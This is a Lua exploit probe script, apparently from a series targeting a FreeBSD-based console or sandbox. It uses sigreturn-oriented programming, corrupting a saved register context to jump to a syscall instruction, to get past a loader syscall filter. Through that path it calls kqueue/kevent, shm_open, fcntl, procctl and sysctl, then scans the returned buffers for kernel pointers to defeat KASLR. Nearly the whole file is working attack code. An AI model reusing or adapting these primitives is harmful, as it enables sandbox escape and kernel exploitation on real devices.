-- CRASH_CLASS: MODERATE
-- PROBE 135b: Kernel-touching syscalls via SROP
--
-- With SROP bypassing the loader filter, test syscalls that interact
-- with kernel objects. Look for KASLR info leaks.
-- Key targets: kevent, shm_open, posix_openpt, fcntl, flock, procctl

print("=== PROBE 135b: KERNEL SYSCALLS VIA SROP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

-- 6-arg SROP
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end  -- RDI
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end  -- RSI
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end  -- RDX
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end  -- R10
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end  -- R8
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end  -- R9
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local P = gpu
local B = gpu + 0x200
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function kptr_check(addr, label)
    local v = memory.read_qword(addr)
    local vh, vl = get_hi_lo(v)
    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
        print("  *** KERNEL POINTER at " .. label .. ": " .. hex(v) .. " ***")
        return true
    end
    return false
end

--------------------------------------------------------------------
-- SECTION A: kevent via SROP (kqueue=362, kevent=560)
--------------------------------------------------------------------
print("")
print("--- [A] kevent ---")

-- kqueue(362)
local rv_kq = srop(362)
print("[A] kqueue=" .. hex(rv_kq))
local kq_fd = to_num(rv_kq)

if kq_fd > 0 and kq_fd < 256 then
    -- Set up a kevent to monitor our TCP socket (fd=4)
    -- struct kevent { uintptr_t ident; short filter; u_short flags;
    --                 u_int fflags; intptr_t data; void *udata; }
    -- = 32 bytes on 64-bit
    local changelist = gpu + 0x300
    -- EV_ADD=1, EVFILT_READ=-1
    memory.write_qword(changelist + 0x00, uint64(4))       -- ident = fd 4
    memory.write_word(changelist + 0x08, 0xFFFF)            -- filter = EVFILT_READ (-1)
    memory.write_word(changelist + 0x0A, 0x0001)            -- flags = EV_ADD
    memory.write_dword(changelist + 0x0C, 0)                -- fflags
    memory.write_qword(changelist + 0x10, uint64(0))        -- data
    memory.write_qword(changelist + 0x18, uint64(0))        -- udata

    local eventlist = gpu + 0x400
    for off = 0, 0x3F, 4 do memory.write_dword(eventlist + off, 0) end

    -- kevent(560): kq, changelist, nchanges, eventlist, nevents, timeout
    -- timeout=NULL for immediate return
    local rv_ke = srop(560,
        uint64(kq_fd),
        ua(changelist), uint64(1),
        ua(eventlist), uint64(4),
        uint64(0))
    print("[A] kevent(add+poll)=" .. hex(rv_ke))
    local keh, kel = get_hi_lo(rv_ke)
    if kel > 0 and kel < 100 then
        print("[A] " .. kel .. " events returned!")
        for i = 0, kel - 1 do
            local base = eventlist + (i * 0x20)
            print(string.format("[A]   event %d: ident=%s filter=%d flags=0x%X data=%s udata=%s",
                i,
                hex(memory.read_qword(base + 0x00)),
                to_num(memory.read_word(base + 0x08)),
                to_num(memory.read_word(base + 0x0A)),
                hex(memory.read_qword(base + 0x10)),
                hex(memory.read_qword(base + 0x18))))
            kptr_check(base + 0x10, "event.data")
            kptr_check(base + 0x18, "event.udata")
        end
    end

    -- Register a timer event
    memory.write_qword(changelist + 0x00, uint64(42))       -- ident = timer id
    memory.write_word(changelist + 0x08, 0xFFF5)             -- filter = EVFILT_TIMER (-11)
    memory.write_word(changelist + 0x0A, 0x0001)             -- flags = EV_ADD
    memory.write_dword(changelist + 0x0C, 0)                 -- fflags
    memory.write_qword(changelist + 0x10, uint64(1))         -- data = 1ms

    for off = 0, 0x3F, 4 do memory.write_dword(eventlist + off, 0) end
    local rv_ke2 = srop(560,
        uint64(kq_fd),
        ua(changelist), uint64(1),
        ua(eventlist), uint64(4),
        uint64(0))
    print("[A] kevent(timer)=" .. hex(rv_ke2))
    local ke2h, ke2l = get_hi_lo(rv_ke2)
    if ke2l > 0 and ke2l < 100 then
        for i = 0, ke2l - 1 do
            local base = eventlist + (i * 0x20)
            print(string.format("[A]   timer event: data=%s udata=%s",
                hex(memory.read_qword(base + 0x10)),
                hex(memory.read_qword(base + 0x18))))
            kptr_check(base + 0x10, "timer.data")
        end
    end

    srop(6, uint64(kq_fd))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: shm_open(482) + ftruncate + mmap
--------------------------------------------------------------------
print("")
print("--- [B] shm_open ---")
ws(P, "/test_shm")
-- shm_open(482): path, flags, mode
-- O_CREAT=0x200, O_RDWR=2
local rv_shm = srop(482, P, uint64(0x202), uint64(0x1FF))
print("[B] shm_open=" .. hex(rv_shm))
local shm_fd = to_num(rv_shm)

if shm_fd > 0 and shm_fd < 256 then
    -- ftruncate(480): set size
    local rv_ft = srop(480, uint64(shm_fd), uint64(0x4000))
    print("[B] ftruncate=" .. hex(rv_ft))

    -- fstat to see kernel object info
    for off = 0, 0x7F, 4 do memory.write_dword(B + off, 0) end
    local rv_fs = srop(189, uint64(shm_fd), ua(B))
    print("[B] fstat=" .. hex(rv_fs))
    if to_num(rv_fs) == 0 then
        for off = 0, 0x70, 8 do
            kptr_check(B + off, string.format("stat+0x%02X", off))
        end
        print("[B] dev=" .. hex(memory.read_qword(B)))
        print("[B] ino=" .. hex(memory.read_qword(B + 8)))
        print("[B] size=" .. hex(memory.read_qword(B + 0x48)))
    end
    srop(6, uint64(shm_fd))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: fcntl on open fds
--------------------------------------------------------------------
print("")
print("--- [C] fcntl ---")

-- F_GETFL=3, F_GETFD=1, F_GETOWN=5
for fd = 0, 6 do
    local rv_fl = srop(92, uint64(fd), uint64(3))
    local rv_fd = srop(92, uint64(fd), uint64(1))
    local rv_own = srop(92, uint64(fd), uint64(5))
    print(string.format("[C] fd=%d: F_GETFL=%s F_GETFD=%s F_GETOWN=%s",
        fd, hex(rv_fl), hex(rv_fd), hex(rv_own)))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: procctl(544) — process control
--------------------------------------------------------------------
print("")
print("--- [D] procctl ---")

-- procctl(idtype, id, cmd, data)
-- PROC_REAP_STATUS=3, PROC_REAP_GETPIDS=4
-- PROC_ASLR_CTL=13, PROC_ASLR_STATUS=14
for off = 0, 0x7F, 4 do memory.write_dword(B + off, 0) end

-- PROC_ASLR_STATUS(14): pid=0 (self)
local rv_aslr = srop(544, uint64(0), uint64(0), uint64(14), ua(B))
print("[D] procctl(ASLR_STATUS)=" .. hex(rv_aslr))
if to_num(rv_aslr) == 0 then
    print("[D] ASLR data: " .. hex(memory.read_qword(B)))
end

-- PROC_REAP_STATUS(3): pid=0
for off = 0, 0x7F, 4 do memory.write_dword(B + off, 0) end
local rv_reap = srop(544, uint64(0), uint64(0), uint64(3), ua(B))
print("[D] procctl(REAP_STATUS)=" .. hex(rv_reap))

-- PROC_STACKGAP_STATUS(18): pid=0
for off = 0, 0x7F, 4 do memory.write_dword(B + off, 0) end
local rv_sg = srop(544, uint64(0), uint64(0), uint64(18), ua(B))
print("[D] procctl(STACKGAP_STATUS)=" .. hex(rv_sg))
if to_num(rv_sg) == 0 then
    print("[D] stackgap: " .. hex(memory.read_qword(B)))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: sysctl with full 6 args via SROP
--------------------------------------------------------------------
print("")
print("--- [E] sysctl (6-arg) ---")

local mib = gpu + 0x500
local outbuf = gpu + 0x600
local oldlenp = gpu + 0xE00

-- kern.version: MIB={1,4}
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 4)
for off = 0, 0x1FF, 4 do memory.write_dword(outbuf + off, 0) end
memory.write_qword(oldlenp, uint64(0x200))

local rv_sc = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
print("[E] kern.version rv=" .. hex(rv_sc))
local retlen = to_num(memory.read_qword(oldlenp))
if to_num(rv_sc) == 0 and retlen > 0 then
    print("[E] " .. retlen .. " bytes returned")
    -- Read as string
    local s = ""
    for i = 0, math.min(retlen, 120) - 1 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b >= 32 and b < 127 then s = s .. string.char(b) end
    end
    print("[E] version: " .. s)
end

-- kern.proc.pathname: MIB={1,14,12,-1}
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 12) -- KERN_PROC_PATHNAME
memory.write_dword(mib + 12, 0xFFFFFFFF)  -- -1 = self
for off = 0, 0x1FF, 4 do memory.write_dword(outbuf + off, 0) end
memory.write_qword(oldlenp, uint64(0x200))

rv_sc = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
print("[E] kern.proc.pathname rv=" .. hex(rv_sc))
retlen = to_num(memory.read_qword(oldlenp))
if to_num(rv_sc) == 0 and retlen > 0 then
    local s = ""
    for i = 0, math.min(retlen, 200) - 1 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b >= 32 and b < 127 then s = s .. string.char(b) end
    end
    print("[E] pathname: " .. s)
end

-- kern.proc.vmmap: MIB={1,14,35,pid}
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 14)
memory.write_dword(mib + 8, 35)  -- KERN_PROC_VMMAP
memory.write_dword(mib + 12, pid)
for off = 0, 0x1FF, 4 do memory.write_dword(outbuf + off, 0) end
memory.write_qword(oldlenp, uint64(0x200))

rv_sc = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
print("[E] kern.proc.vmmap rv=" .. hex(rv_sc))
if to_num(rv_sc) == 0 then
    retlen = to_num(memory.read_qword(oldlenp))
    print("[E] vmmap " .. retlen .. " bytes")
    for off = 0, math.min(retlen, 0x80) - 4, 8 do
        kptr_check(outbuf + off, string.format("vmmap+0x%02X", off))
    end
end

print("")
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
